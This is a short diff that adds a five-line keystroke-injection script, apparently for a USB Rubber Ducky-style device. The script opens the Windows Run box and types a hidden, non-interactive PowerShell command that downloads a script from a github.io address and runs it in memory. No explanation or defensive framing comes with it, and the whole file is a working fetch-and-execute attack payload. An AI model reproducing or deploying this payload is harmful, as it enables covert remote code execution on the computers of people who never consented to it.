@@ -1,0 +1,5 @@
+DELAY 300
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/runAll.ps1')
+ENTER
